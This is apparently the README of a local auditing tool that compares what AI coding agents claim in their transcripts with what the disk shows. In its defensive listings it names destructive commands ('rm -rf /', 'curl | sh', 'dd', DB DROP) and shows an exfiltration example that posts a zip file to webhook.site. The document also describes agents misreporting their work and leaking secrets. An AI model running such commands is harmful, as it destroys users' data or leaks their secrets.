# agenttrueup (`trueup`)

**Trust, but reconcile.** Verify what your AI coding agent *said* against what your
filesystem, git state and dependency manifests *actually show* — and flag what it
left behind.

**信任，但要对账。** 把 AI 编码智能体“说它做过的事”与文件系统、git 状态、依赖清单里的
“实际发生的事”逐条核对，并报告它留下的残留物。

100% local · read-only · zero dependencies (pure Python stdlib) · redacted output by default
Runs on **Linux / macOS / Windows** (CI covers all three).

**Who it's for**: anyone running Claude Code, Codex CLI, ZCode (or similar) on
their own machine — especially in auto-approve / yolo modes, where nobody is
watching each action.

**Pairs with [redhand](https://github.com/Yuh302331-ctrl/redhand)** — the
realtime counterpart that watches your folders and journals every change as
it happens. trueup reads that journal as a facts source (see
[Facts source: the redhand journal](#facts-source-the-redhand-journal)):
the camera feeds the auditor.

## The idea in 10 seconds

Your agent's transcript says one thing. The disk says another. trueup reads the
transcripts your agents *already wrote to disk* and reconciles the two:

```text
Agent claims:  "Done — I deleted `demo-key.txt`, installed `left-pad`."
trueup:        ✗ demo-key.txt  — claimed deleted but the file STILL EXISTS
               ✗ left-pad      — not recorded in any dependency manifest
               ⚠ command found: curl -s https://webhook.site/… --data @bundle.zip
                 (data-bearing POST to a request-capture endpoint → CRITICAL)
               ⚠ secret found in session: aws_access_key (sha256:8bcac790…) [redacted]
```

No LLM inside trueup: every verdict is a deterministic check you can audit.

---

## Facts source: the redhand journal

Disk state is a snapshot — it cannot tell *when* something happened or who
did it. [redhand](https://github.com/Yuh302331-ctrl/redhand) journals every file
change (event, timestamp, attributed actor) while your agents work. If a
journal is present, trueup upgrades claim verification from "check the disk
now" to "check the recorded event stream":

- `deleted` claim + a journal deletion event → ✓ **confirmed by the journal**
  (actor and timestamp quoted);
- `deleted` claim + no deletion in the journal around the claim → ✗
  **contradicted by the event stream** (HIGH finding) — even if a later
  process muddied the disk state;
- a file deleted as claimed but recreated afterwards (by any actor) →
  MEDIUM finding with who recreated it and when;
- `created`/`edited` claims get the same treatment.

Discovery is automatic (walks up from each session's project for
`.whodunit/journal.db`, 3 levels); `--journal PATH` adds explicit roots and
`--no-journal` turns the integration off. Reading is strictly read-only
(WAL-safe, never blocks a running watcher), and an unreadable journal
degrades to a warning — never a crash.

**Recall ceiling, stated plainly**: trueup verifies only claims it *extracts*
from transcripts — a change the agent never mentions is invisible to the
ledger (deterministic parsing; no LLM guessing). The journal-backed checks
raise the *accuracy* of extracted-claim verdicts, not the *coverage* of
unspoken work. For the full event stream, read the redhand journal directly
([schema contract](https://github.com/Yuh302331-ctrl/redhand/blob/main/docs/JOURNAL.md)).

**Two-minute setup (the pair as one product):**

```bash
pipx install redhand agenttrueup     # two tools, one trust chain
cd your-project
redhand watch &                      # camera: journal every change live
trueup scan --since 1d               # auditor: reconcile claims vs facts
trueup scan --fail-on high           # CI gate on dangerous activity
```

## Why this exists

AI coding agents now run with alarming autonomy, and 2026 research keeps confirming
the trust gap:

- Claude Code's "don't ask again" approvals **stored secrets in plaintext** in
  `settings.local.json` — Apiiro found **2,539 real secrets across 1,994 public GitHub
  repos** ([Apiiro, Nov 2026](https://apiiro.com/blog/coding-agents-leaking-secrets-github-dont-ask-again),
  [CSA research note, Nov 2026](https://labs.cloudsecurityalliance.org/research/csa-research-note-claude-code-settings-secret-leak-20261108)).
- Agents routinely **claim** work ("deleted the key file", "installed the dependency",
  "tests pass") that the filesystem does not confirm. Existing tools tell you *what
  the agent did* — none of them reconcile *what it said* with *what is true now*.

`trueup` closes that gap. It parses the session transcripts your agents already write
to disk, extracts claims and risky actions, and checks each one against reality.

## What it checks

Every scan answers four questions: **它说的和事实一致吗？泄露了什么？干了什么危险的事？留下了什么？**

| Check | Meaning |
|---|---|
| **Claims ledger** | Every "created / edited / deleted / installed X" claim gets a verdict: ✓ verified against disk · ✗ contradicted by disk · ○ unverifiable |
| **Secrets exposure** | API keys, tokens, private-key blocks, credential-bearing URLs inside commands, messages and written-file snapshots — **shown redacted** (kind + sha256 fingerprint), `--reveal` to see raw |
| **Dangerous commands** | `rm -rf /`, `curl \| sh`, force pushes, `git reset --hard`, `chmod -R 777`, `dd of=/dev/…`, history wiping, DB `DROP` … severity-graded |
| **Exfiltration signals** | Requests to webhook.site / Discord / Telegram-bot / request-bin style endpoints — flagged **critical**; generic data-bearing uploads (`curl -d …`) — **medium** |
| **Settings leak** | Secrets persisted inside Claude Code permission files (the documented 2026 leak pattern) |
| **Residue** | Agent-created files still uncommitted, editor/backup litter (`.bak`, `.orig`, …) |

Plus an **MCP server mode** (`trueup mcp`): your *current* agent can call
`trueup_scan` / `trueup_doctor` as MCP tools and self-audit — zero dependencies,
stdio JSON-RPC.

Verification is deterministic — no LLM, no network, no judgment calls you can't audit:

- *deleted* claim → does the file **still exist**? → ✗ high
- *created* claim → does the file exist? missing → ✗ low (temporary/scratch paths are expected and excluded)
- *edited* claim → does the file exist, and does its mtime postdate the session?
- ZCode sessions: the artifact store records **exact before/after content** — trueup
  re-reads the file and compares its content against what was written
- *installed* claim → is the package recorded in `package.json` / `pyproject.toml` /
  `requirements*.txt` / `go.mod` / `Cargo.toml` / `Gemfile`? → ✗ high if missing

## Quick start

Requires Python 3.11+ (stdlib only — no runtime dependencies).

```bash
# from this repo (not on PyPI yet)
pip install "agenttrueup @ git+https://github.com/Yuh302331-ctrl/agenttrueup.git"
pipx install "agenttrueup @ git+https://github.com/Yuh302331-ctrl/agenttrueup.git"
# or from a clone / without installing:
pip install . && trueup doctor
python -m agenttrueup doctor
```

**Try it in 30 seconds** — audit the synthetic demo shipped in this repo
(synthetic data, no real credentials):

```bash
trueup scan --only examples/demo-claude-session.jsonl
```

Then audit your real machine (read-only):

```bash
trueup doctor          # which agent stores were detected?
trueup scan            # audit every detected store
trueup scan --since 7d --agent claude,codex
trueup scan --json     # machine-readable
trueup scan --sarif    # SARIF 2.1.0 for GitHub code scanning
trueup scan --fail-on high && echo "clean"   # CI gate (exit 1 if ≥ high)
trueup mcp             # MCP server: agents self-audit via tools/call
```

Exit codes: `0` clean · `1` findings at/above `--fail-on` (default `high`) · `2` usage error.

Full command reference: [docs/USAGE.md](docs/USAGE.md) · architecture & how to
add an agent parser: [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) · planned
features: [docs/ROADMAP.md](docs/ROADMAP.md) · runnable demo: [examples/](examples/).

### Sample output (real run, secrets redacted)

```
trueup — trust, but reconcile
scanned 3 store(s), 35 session(s), 762 event(s) in 1.15s

FINDINGS (52)   critical:1  high:5  medium:1  low:45

 [CRIT] secret  private_key_block exposed in agent session
        private_key_block — sha256:8bcac7908eb9 (use --reveal to see it)
        at ~/.zcode/cli/rollout/model-io-session_….jsonl   [zcode · session_55259fc0f5]
        |     hits = find_secrets("<private_key_block:8bcac7908eb9>")
        → Rotate this credential and scrub the transcript.

CLAIMS LEDGER (276)   ✓ 227 verified   ✗ 45 failed   ○ 4 unverifiable
  ✗ created   …/workspace/default/daily-news/2026-11-05.txt — claimed created but the file is missing now   [zcode tool]
  ✓ created   …/style.css — content on disk matches what the tool wrote   [zcode artifact]
  ○ installed pypi:torch — no dependency manifest found near the session project   [codex command]
```

## Supported agents

| Agent | Source | Coverage |
|---|---|---|
| Claude Code | `~/.claude/projects/**/*.jsonl` | full (commands, tools, messages) |
| Codex CLI | `~/.codex/sessions/**/*.jsonl` | full incl. `apply_patch` file ops |
| ZCode | `~/.zcode/cli/rollout/*.jsonl` + `~/.zcode/cli/artifacts/` | full incl. byte-exact write verification |
| Gemini CLI / Goose / OpenCode / Qwen | generic best-effort harvest | commands/messages basics |
| Anything else | pass files/dirs to `trueup scan PATH` | generic sniffing |

## How it differs from related tools

| Tool | What it does | What trueup adds |
|---|---|---|
| [coding_agent_session_search](https://github.com/dicklesworthstone/coding_agent_session_search) | search across 30+ agent transcript stores | not verification — trueup *reconciles claims vs reality* |
| [ranwhat](https://github.com/MatijaMiki/ranwhat), [sessionguard](https://github.com/sessionguard/sessionguard) | post-session audit of *what ran* | trueup also checks *whether what the agent said matches what ran and what's on disk* |
| [trustbut](https://github.com/isAlmogK/trustbut), [writeguard](https://github.com/brokenbartender/writeguard) | verify claimed edits (single agent, hash-based) | trueup verifies deleted/created/installed claims, residue, secrets and exfil — multi-agent |
| [AgentLint](https://github.com/agentlint/agentlint) | lints CLAUDE.md/AGENTS.md quality | different layer: instruction files, not session behavior |
| [gitleaks](https://github.com/gitleaks/gitleaks) | scans repo *files* for secrets | trueup scans *transcripts* — secrets that only ever existed inside a session (commands, tool outputs) never touch repo files |

## Limitations (honest)

- Claims extracted from natural language are conservative (quoted/backticked path-like
  subjects only); "tests pass"-style claims are listed as unverifiable, never faked.
- Verification is point-in-time: a file deleted *after* the session looks like "missing".
- Transcript scanning is capped (20,000 lines/file, 5,000 files/store, 6,000
  events/session); very large stores are scanned partially and a warning says so.
- Generic (non-Claude/Codex/ZCode) parsing is best-effort string harvesting.
- Heuristics can produce false positives/negatives — findings are leads, not verdicts.

## Privacy & safety

- Reads transcripts under your home directory and `paths` you pass; **writes nothing**
  except its own stdout. No network access, no telemetry.
- Secrets are redacted in every output mode (text/JSON/SARIF) by default; `--reveal`
  exists for when *you* need the raw value.

## Development

```bash
python -m pytest tests/          # 48 tests, no network needed
```

CI runs the suite on Ubuntu / macOS / Windows × Python 3.11–3.13
([.github/workflows/ci.yml](.github/workflows/ci.yml)).

## 中文简介

**agenttrueup（命令名 `trueup`）**：AI 编码智能体的“对账”工具。Agent 收工后，
它把 Agent *说*做过的事与文件系统 / git / 依赖清单里 *实际*发生的事逐条核对。

- **验证声明**：声称删除的文件还在吗？声称安装的依赖进 manifest 了吗？声称的修改真的落盘了吗？（有内容快照时比对磁盘内容与当时写入的内容）
- **泄露扫描**：命令、消息、写入文件快照里的 API key / token / 私钥块 / 带密码的连接串——默认脱敏显示（只给类型 + SHA256 指纹）
- **危险命令分级**：`rm -rf /`、`curl | sh`、强推、`reset --hard`、抹历史、数据库 `DROP` 等
- **外传信号**：向 webhook.site / Discord / Telegram-bot 类收集端点发数据 → critical
- **残留物**：Agent 创建却未提交的文件、备份垃圾

```bash
pip install agenttrueup   # 或 pipx / uv tool；纯标准库，零运行时依赖
trueup scan               # 只读、离线，审计本机全部已检测到的会话
trueup scan --only examples/demo-claude-session.jsonl   # 30 秒上手 demo
```

退出码可直接做 CI 门禁（`--fail-on high`）；也支持 `--json` / `--sarif` 输出和
MCP 服务器模式（`trueup mcp`）。验证全部是确定性检查，不含 LLM、不联网。
已知局限见上文 [Limitations](#limitations-honest)。

## License

MIT — see [LICENSE](LICENSE).
